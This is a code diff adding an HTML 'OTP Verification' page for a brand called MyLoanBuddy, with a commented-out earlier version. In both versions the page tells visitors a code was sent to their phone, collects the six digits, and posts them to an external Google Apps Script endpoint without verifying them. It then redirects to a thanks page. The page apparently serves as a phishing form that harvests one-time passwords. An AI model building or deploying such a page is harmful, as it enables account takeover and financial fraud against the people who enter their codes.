@@ -1,0 +1,222 @@
+<!-- 
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Enter OTP - MyLoanBuddy</title>
+    <link rel="stylesheet" href="../style.css" />
+  </head>
+  <body>
+    <section class="section light">
+      <div class="container" style="max-width: 400px">
+        <h2>OTP Verification</h2>
+        <p>We have sent an OTP to your phone number.</p>
+
+         
+        <form id="otpForm">
+          <div class="form-group">
+            <label>Enter OTP</label>
+            <input
+              type="number"
+              name="otp"
+              placeholder="Enter 6-digit OTP"
+              required
+            />
+          </div>
+
+          <button type="submit" class="btn">Verify OTP</button>
+        </form>
+      </div>
+    </section>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const scriptURL =
+          "https://script.google.com/macros/s/AKfycbwVm00RDlaMrfrQ-79MfmykZ5uyQDWXlXOwjKlZIl9cYfDOjGDkUX-bMR18k96PyJ0/exec";
+
+        const otpForm = document.getElementById("otpForm");
+
+        if (!otpForm) {
+          console.error("Form not found: otpForm");
+          return;
+        }
+
+        otpForm.addEventListener("submit", function (e) {
+          e.preventDefault();
+
+          const data = {
+            type: "otp",
+            otp: this.otp.value,
+          };
+
+          fetch(scriptURL, {
+            method: "POST",
+            mode: "no-cors",
+            body: JSON.stringify(data),
+          })
+            .then(() => {
+              window.location.href = "/thanks/";
+            })
+            .catch((err) => {
+              console.error(err);
+              alert("Error saving OTP");
+            });
+        });
+      });
+    </script>
+  </body>
+</html> -->
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>OTP Verification - MyLoanBuddy</title>
+    <link rel="stylesheet" href="../style.css" />
+
+    <style>
+      body {
+        background: #f6fdf8;
+        font-family: "Poppins", sans-serif;
+      }
+
+      .otp-wrapper {
+        max-width: 420px;
+        margin: 80px auto;
+        background: #fff;
+        padding: 35px;
+        border-radius: 16px;
+        box-shadow: 0 6px 20px rgba(0, 0, 0, 0.1);
+        text-align: center;
+      }
+
+      .otp-wrapper h2 {
+        color: #0a8837;
+        margin-bottom: 10px;
+      }
+
+      .otp-wrapper p {
+        color: #444;
+        font-size: 15px;
+        margin-bottom: 25px;
+      }
+
+      /* OTP BOXES */
+      .otp-inputs {
+        display: flex;
+        justify-content: space-between;
+        gap: 10px;
+        margin-bottom: 25px;
+      }
+
+      .otp-box {
+        width: 50px;
+        height: 55px;
+        border-radius: 10px;
+        border: 1.8px solid #bcd9c7;
+        font-size: 22px;
+        text-align: center;
+        font-weight: 600;
+        outline: none;
+        transition: 0.2s;
+      }
+
+      .otp-box:focus {
+        border-color: #0a8837;
+        box-shadow: 0 0 6px rgba(10, 136, 55, 0.3);
+      }
+
+      .btn-verify {
+        width: 100%;
+        padding: 15px;
+        font-size: 18px;
+        background: #0a8837;
+        color: white;
+        border: none;
+        border-radius: 8px;
+        cursor: pointer;
+        font-weight: 600;
+      }
+
+      .btn-verify:hover {
+        background: #0d9d41;
+      }
+
+      /* Mobile Fix */
+      @media (max-width: 480px) {
+        .otp-wrapper {
+          margin: 40px 20px;
+          padding: 25px;
+        }
+
+        .otp-box {
+          width: 45px;
+          height: 50px;
+          font-size: 20px;
+        }
+      }
+    </style>
+  </head>
+
+  <body>
+    <div class="otp-wrapper">
+      <h2>OTP Verification</h2>
+      <p>Please enter the 6-digit code sent to your phone.</p>
+
+      <form id="otpForm">
+        <div class="otp-inputs">
+          <input type="text" maxlength="1" class="otp-box" />
+          <input type="text" maxlength="1" class="otp-box" />
+          <input type="text" maxlength="1" class="otp-box" />
+          <input type="text" maxlength="1" class="otp-box" />
+          <input type="text" maxlength="1" class="otp-box" />
+          <input type="text" maxlength="1" class="otp-box" />
+        </div>
+
+        <button type="submit" class="btn-verify">Verify OTP</button>
+      </form>
+    </div>
+
+    <script>
+      /* OTP Auto Focus & Auto Move */
+      const otpInputs = document.querySelectorAll(".otp-box");
+
+      otpInputs.forEach((input, index) => {
+        input.addEventListener("input", () => {
+          if (input.value.length === 1 && index < otpInputs.length - 1) {
+            otpInputs[index + 1].focus();
+          }
+        });
+
+        input.addEventListener("keydown", (e) => {
+          if (e.key === "Backspace" && index > 0 && !input.value) {
+            otpInputs[index - 1].focus();
+          }
+        });
+      });
+
+      /* OTP Form Submit */
+      document.getElementById("otpForm").addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        const otp = Array.from(otpInputs)
+          .map((i) => i.value)
+          .join("");
+
+        const scriptURL =
+          "https://script.google.com/macros/s/AKfycbwVm00RDlaMrfrQ-79MfmykZ5uyQDWXlXOwjKlZIl9cYfDOjGDkUX-bMR18k96PyJ0/exec";
+
+        fetch(scriptURL, {
+          method: "POST",
+          mode: "no-cors",
+          body: JSON.stringify({
+            type: "otp",
+            otp: otp,
+          }),
+        }).then(() => {
+          window.location.href = "/thanks/";
+        });
+      });
+    </script>
+  </body>
+</html>
